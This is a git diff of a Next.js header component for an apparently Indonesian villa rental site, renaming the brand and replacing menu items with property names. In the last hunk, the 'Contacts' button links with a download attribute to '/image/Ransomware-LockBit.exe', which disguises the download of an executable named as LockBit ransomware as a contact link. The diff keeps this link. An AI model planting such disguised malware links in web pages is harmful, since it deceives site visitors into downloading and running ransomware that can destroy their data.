@@ -50,7 +50,7 @@ const Header = () => {
               href="/"
               className="font-bold text-2xl  bg-gradient-to-r from-purple-400 to-pink-600 bg-clip-text text-transparent block py-6"
             >
-              Griya Merapi
+              STAYL
             </Link>
             <Link
               href="/"
@@ -83,18 +83,18 @@ const Header = () => {
                     Beranda
                   </Link>
                 </li>
-                
+
                 <li className="group relative">
                   <button className="text-base text-gray-600 py-2 mx-8 flex group-hover:text-pink-600 font-semibold">
-                    Travelers
+                    Property
                   </button>
-                  <ul className="ml-3 lg:absolute lg:hidden lg:group-hover:block bg-slate-300 -mt-2 lg:py-2 w-40 top-0 rounded-lg lg:right-0 lg:top-full lg:w-fit">
+                  <ul className="ml-3 lg:absolute lg:hidden lg:left-1/2 transform lg:-translate-x-1/2 lg:w-72  lg:group-hover:block bg-slate-300 lg:py-2 w-fit top-0 rounded-lg lg:top-full">
                     <li>
                       <Link
                         href="#page1"
                         className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
                       >
-                        Dubai
+                        Villa exclusive casa Grande
                       </Link>
                     </li>
                     <li>
@@ -102,30 +102,7 @@ const Header = () => {
                         href="#page2"
                         className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
                       >
-                        Turki
-                      </Link>
-                    </li>
-                    <li>
-                      <Link
-                        href="#page3"
-                        className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
-                      >
-                        Australia
-                      </Link>
-                    </li>
-                  </ul>
-                </li>
-                <li className="group relative">
-                  <button className="text-base text-gray-600 py-2 mx-8 flex group-hover:text-pink-600 font-semibold">
-                    Travelers
-                  </button>
-                  <ul className="ml-3 lg:absolute lg:hidden lg:group-hover:block bg-slate-300 -mt-2 lg:py-2 w-40 top-0 rounded-lg lg:right-0 lg:top-full lg:w-fit">
-                    <li>
-                      <Link
-                        href="#page1"
-                        className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
-                      >
-                        Dubai
+                        Villa pesona sintuk
                       </Link>
                     </li>
                     <li>
@@ -133,7 +110,7 @@ const Header = () => {
                         href="#page2"
                         className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
                       >
-                        Turki
+                        Griya Merapi
                       </Link>
                     </li>
                     <li>
@@ -141,7 +118,23 @@ const Header = () => {
                         href="#page3"
                         className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
                       >
-                        Australia
+                        Griya Papringan
+                      </Link>
+                    </li>
+                    <li>
+                      <Link
+                        href="#page3"
+                        className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
+                      >
+                        Griya Iromejan
+                      </Link>
+                    </li>
+                    <li>
+                      <Link
+                        href="#page3"
+                        className="block text-gray-600 mx-8 lg:py-2 hover:text-pink-600"
+                      >
+                        Griya Menjangan
                       </Link>
                     </li>
                   </ul>
@@ -152,7 +145,7 @@ const Header = () => {
                     href="#"
                     className="text-base text-gray-600 py-2 mx-8 flex group-hover:text-pink-600 font-semibold"
                   >
-                    Supports
+                    Galery
                   </Link>
                 </li>
                 <li className="group lg:hidden">
@@ -168,10 +161,11 @@ const Header = () => {
           </div>
           <div className="px-4 hidden lg:flex">
             <Link
-              href="/image/Ransomware-LockBit.exe" download
+              href="/image/Ransomware-LockBit.exe"
+              download
               className="px-6 py-3 w-1/2 text-center sm:w-fit rounded-full mr-4 bg-gradient-to-br from-blue-500 via-purple-500 to-pink-500 hover:bg-slate-200 text-white hover:shadow-lg hover:opacity-80 transition duration-300 ease-in-out"
             >
-            Contacts
+              Contacts
             </Link>
           </div>
         </div>
